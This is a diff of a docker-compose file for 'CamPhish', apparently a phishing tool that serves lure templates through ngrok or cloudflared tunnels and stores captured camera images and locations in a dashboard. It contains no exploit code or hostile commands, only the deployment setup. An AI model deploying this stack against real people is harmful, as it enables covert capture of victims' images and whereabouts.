@@ -1,293 +1,108 @@
 services:
   # =========================================================================
-  # Core Application (always present)
+  # TrailBase — Data layer (DEPRECATED — schema exists for future use,
+  # but data operations go through SQLite. The Rust app does not write to
+  # TrailBase. Keep for admin UI access if desired.)
+  # =========================================================================
+  trailbase:
+    image: trailbase/trailbase:0.3.0
+    container_name: camphish-trailbase
+    restart: unless-stopped
+    ports:
+      - "127.0.0.1:4000:4000"
+    environment:
+      - ADDRESS=0.0.0.0:4000
+      - ADMIN_EMAIL=${TRAILBASE_ADMIN_EMAIL:-admin@camphish.local}
+      - ADMIN_PASSWORD=${TRAILBASE_ADMIN_PASSWORD:-changeme}
+    volumes:
+      - trailbase_data:/app/traildepot
+      - ./trailbase/schema:/schema:ro
+    entrypoint: ["/bin/sh", "-c", "mkdir -p /app/traildepot/migrations && cp /schema/*.sql /app/traildepot/migrations/ 2>/dev/null; exec /app/trail run"]
+    healthcheck:
+      test: ["CMD", "wget", "-q", "--spider", "http://localhost:4000/_/admin/"]
+      interval: 10s
+      timeout: 5s
+      retries: 10
+      start_period: 20s
+    networks:
+      - camphish-net
+
+  # =========================================================================
+  # CamPhish — Application server (template serving + capture + dashboard)
   # =========================================================================
   app:
-    image: ${IMAGE_NAME:-camphish-app}
     build: .
+    image: camphish:${VERSION:-2.1.0}
     container_name: camphish-app
     restart: unless-stopped
     ports:
-      - "127.0.0.1:3333:80"
+      - "127.0.0.1:8080:8080"
     volumes:
-      - captures:/data/captures
-      - locations:/data/locations
-      - logs:/data/logs
-      - config:/data/config
-      - ./app/public:/var/www/html:ro
+      - camphish_data:/app/data
+      - ./templates:/app/templates:ro
     environment:
-      - TUNNEL=${TUNNEL:-cloudflared}
-      - NGROK_AUTHTOKEN=${NGROK_AUTHTOKEN:-}
-      - SESSION_NAME=${SESSION_NAME:-default}
-      - DEFAULT_TEMPLATE=${DEFAULT_TEMPLATE:-1}
-      - FESTIVAL_NAME=${FESTIVAL_NAME:-NewYear}
-      - YOUTUBE_VIDEO_ID=${YOUTUBE_VIDEO_ID:-dQw4w9WgXcQ}
+      - DATA_DIR=/app/data
+      - TEMPLATES_DIR=/app/templates
+      - FRONTEND_DIR=/app/frontend/dist
+      - LISTEN_ADDR=0.0.0.0:8080
+      - TUNNEL_LINK=${TUNNEL_LINK:-}
+      - RUST_LOG=${LOG_LEVEL:-info}
+      - GRACEFUL_SHUTDOWN=true
+      - ENABLE_COMPRESSION=true
+      - ENABLE_TEMPLATE_CACHE=true
+      - TRAILBASE_URL=http://trailbase:4000
+      - TRAILBASE_API_KEY=${TRAILBASE_API_KEY:-}
+    depends_on:
+      trailbase:
+        condition: service_started
     healthcheck:
-      test: ["CMD", "curl", "-f", "http://localhost:80/health.php"]
-      interval: 30s
+      test: ["CMD", "curl", "-f", "http://localhost:8080/api/health"]
+      interval: ${HEALTH_CHECK_INTERVAL:-30}s
       timeout: 5s
-      retries: 3
-      start_period: 10s
+      retries: ${HEALTH_CHECK_RETRIES:-3}
+      start_period: ${HEALTH_CHECK_START_PERIOD:-10}s
+    deploy:
+      resources:
+        limits:
+          memory: 512M
+        reservations:
+          memory: 64M
     networks:
       - camphish-net
 
   # =========================================================================
-  # Dashboard
-  # =========================================================================
-  dashboard:
-    image: ${IMAGE_NAME:-camphish-app}-dashboard
-    build:
-      context: .
-      dockerfile: docker/Dockerfile.dashboard
-    container_name: camphish-dashboard
-    restart: unless-stopped
-    ports:
-      - "127.0.0.1:${DASHBOARD_PORT:-8080}:80"
-    volumes:
-      - captures:/data/captures:ro
-      - locations:/data/locations:ro
-      - logs:/data/logs
-      - config:/data/config:ro
-    environment:
-      - SESSION_NAME=${SESSION_NAME:-default}
-    depends_on:
-      app:
-        condition: service_healthy
-    networks:
-      - camphish-net
-
-  # =========================================================================
-  # Tunnel: Ngrok (profile: ngrok)
-  # =========================================================================
-  ngrok:
-    image: ngrok/ngrok:latest
-    container_name: camphish-ngrok
-    restart: unless-stopped
-    profiles:
-      - ngrok
-    command: ["http", "app:80", "--log=stdout", "--log-format=json"]
-    environment:
-      - NGROK_AUTHTOKEN=${NGROK_AUTHTOKEN}
-    depends_on:
-      app:
-        condition: service_healthy
-    networks:
-      - camphish-net
-
-  # =========================================================================
-  # Tunnel: Cloudflared (profile: cloudflared)
+  # Tunnels
   # =========================================================================
   cloudflared:
     image: cloudflare/cloudflared:latest
     container_name: camphish-cloudflared
     restart: unless-stopped
-    profiles:
-      - cloudflared
-    command: ["tunnel", "--url", "http://app:80", "--no-autoupdate"]
+    profiles: [cloudflared]
+    command: ["tunnel", "--url", "http://app:8080", "--no-autoupdate"]
     depends_on:
       app:
         condition: service_healthy
     networks:
       - camphish-net
 
-  # =========================================================================
-  # Self-Hosted Mode (profile: self-hosted)
-  # =========================================================================
-  app-self-hosted:
-    extends:
-      service: app
-    container_name: camphish-app-self-hosted
-    profiles:
-      - self-hosted
-    ports:
-      - "127.0.0.1:8082:80"
-    labels:
-      - "camphish.component=app"
-      - "camphish.fqdn=${SUBDOMAIN:-camphish}.${DOMAIN}"
-
-  dashboard-self-hosted:
-    extends:
-      service: dashboard
-    container_name: camphish-dashboard-self-hosted
-    profiles:
-      - self-hosted
-    ports:
-      - "127.0.0.1:${DASHBOARD_PORT:-8080}:80"
-    labels:
-      - "camphish.component=dashboard"
-      - "camphish.fqdn=dashboard.${SUBDOMAIN:-camphish}.${DOMAIN}"
-
-  # =========================================================================
-  # Reverse Proxy: Caddy (profile: proxy-caddy)
-  # =========================================================================
-  proxy-caddy:
-    image: ${CADDY_IMAGE:-caddy:2-alpine}
-    container_name: camphish-proxy-caddy
+  ngrok:
+    image: ngrok/ngrok:latest
+    container_name: camphish-ngrok
     restart: unless-stopped
-    profiles:
-      - proxy-caddy
-    ports:
-      - "${CADDY_HTTP_PORT:-80}:80"
-      - "${CADDY_HTTPS_PORT:-443}:443"
-    volumes:
-      - ./proxy/caddy/Caddyfile:/etc/caddy/Caddyfile:ro
-      - caddy_data:/data
-      - caddy_config:/config
+    profiles: [ngrok]
+    command: ["http", "app:8080", "--log=stdout"]
     environment:
-      - DOMAIN=${DOMAIN}
-      - SUBDOMAIN=${SUBDOMAIN:-camphish}
-      - LETSENCRYPT_EMAIL=${LETSENCRYPT_EMAIL:-}
-      - DASHBOARD_PORT=${DASHBOARD_PORT:-8080}
+      - NGROK_AUTHTOKEN=${NGROK_AUTHTOKEN:-}
     depends_on:
-      - app-self-hosted
-      - dashboard-self-hosted
+      app:
+        condition: service_healthy
     networks:
       - camphish-net
 
-  # =========================================================================
-  # Reverse Proxy: Traefik (profile: proxy-traefik)
-  # =========================================================================
-  proxy-traefik:
-    image: ${TRAEFIK_IMAGE:-traefik:v3.3}
-    container_name: camphish-proxy-traefik
-    restart: unless-stopped
-    profiles:
-      - proxy-traefik
-    ports:
-      - "${TRAEFIK_HTTP_PORT:-80}:80"
-      - "${TRAEFIK_HTTPS_PORT:-443}:443"
-      - "127.0.0.1:${TRAEFIK_DASHBOARD_PORT:-8081}:8080"
-    volumes:
-      - ./proxy/traefik/traefik.yml:/etc/traefik/traefik.yml:ro
-      - ./proxy/traefik/dynamic.yml:/etc/traefik/dynamic.yml:ro
-      - traefik_acme:/letsencrypt
-      - /var/run/docker.sock:/var/run/docker.sock:ro
-    environment:
-      - DOMAIN=${DOMAIN}
-      - SUBDOMAIN=${SUBDOMAIN:-camphish}
-      - LETSENCRYPT_EMAIL=${LETSENCRYPT_EMAIL:-}
-      - DASHBOARD_PORT=${DASHBOARD_PORT:-8080}
-      - CF_API_TOKEN=${CF_API_TOKEN:-}
-      - CF_ZONE_ID=${CF_ZONE_ID:-}
-    depends_on:
-      - app-self-hosted
-      - dashboard-self-hosted
-    networks:
-      - camphish-net
-
-  # =========================================================================
-  # Reverse Proxy: Nginx (profile: proxy-nginx)
-  # =========================================================================
-  proxy-nginx:
-    image: ${NGINX_IMAGE:-nginx:alpine}
-    container_name: camphish-proxy-nginx
-    restart: unless-stopped
-    profiles:
-      - proxy-nginx
-    ports:
-      - "${NGINX_HTTP_PORT:-80}:80"
-      - "${NGINX_HTTPS_PORT:-443}:443"
-    volumes:
-      - ./proxy/nginx/nginx.conf:/etc/nginx/nginx.conf:ro
-      - ./proxy/nginx/conf.d:/etc/nginx/conf.d:ro
-      - nginx_acme:/etc/letsencrypt
-      - nginx_acme_challenge:/var/www/certbot
-    environment:
-      - DOMAIN=${DOMAIN}
-      - SUBDOMAIN=${SUBDOMAIN:-camphish}
-      - DASHBOARD_PORT=${DASHBOARD_PORT:-8080}
-    depends_on:
-      - app-self-hosted
-      - dashboard-self-hosted
-    networks:
-      - camphish-net
-
-  # =========================================================================
-  # Certbot for Nginx (profile: proxy-nginx)
-  # =========================================================================
-  certbot:
-    image: certbot/certbot:latest
-    container_name: camphish-certbot
-    restart: "no"
-    profiles:
-      - proxy-nginx
-    volumes:
-      - nginx_acme:/etc/letsencrypt
-      - nginx_acme_challenge:/var/www/certbot
-    entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew --webroot --webroot-path=/var/www/certbot --quiet; sleep 12h; done'"
-    networks:
-      - camphish-net
-
-  # =========================================================================
-  # Coolify Mode (profile: coolify)
-  # =========================================================================
-  app-coolify:
-    extends:
-      service: app
-    container_name: camphish-app-coolify
-    profiles:
-      - coolify
-    ports:
-      - "80"
-    labels:
-      - "traefik.enable=true"
-      - "traefik.http.routers.camphish.rule=Host(`${SUBDOMAIN:-camphish}.${DOMAIN}`)"
-      - "traefik.http.routers.camphish.entrypoints=websecure"
-      - "traefik.http.routers.camphish.tls.certresolver=letsencrypt"
-      - "traefik.http.services.camphish.loadbalancer.server.port=80"
-
-  dashboard-coolify:
-    extends:
-      service: dashboard
-    container_name: camphish-dashboard-coolify
-    profiles:
-      - coolify
-    ports:
-      - "80"
-    labels:
-      - "traefik.enable=true"
-      - "traefik.http.routers.camphish-dashboard.rule=Host(`dashboard.${SUBDOMAIN:-camphish}.${DOMAIN}`)"
-      - "traefik.http.routers.camphish-dashboard.entrypoints=websecure"
-      - "traefik.http.routers.camphish-dashboard.tls.certresolver=letsencrypt"
-      - "traefik.http.services.camphish-dashboard.loadbalancer.server.port=80"
-
-# =========================================================================
-# Volumes
-# =========================================================================
 volumes:
-  captures:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ${DATA_DIR:-./data}/captures
-  locations:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ${DATA_DIR:-./data}/locations
-  logs:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ${DATA_DIR:-./data}/logs
-  config:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ${DATA_DIR:-./data}/config
-  caddy_data:
-  caddy_config:
-  traefik_acme:
-  nginx_acme:
-  nginx_acme_challenge:
+  camphish_data:
+  trailbase_data:
 
-# =========================================================================
-# Networks
-# =========================================================================
 networks:
   camphish-net:
     driver: bridge
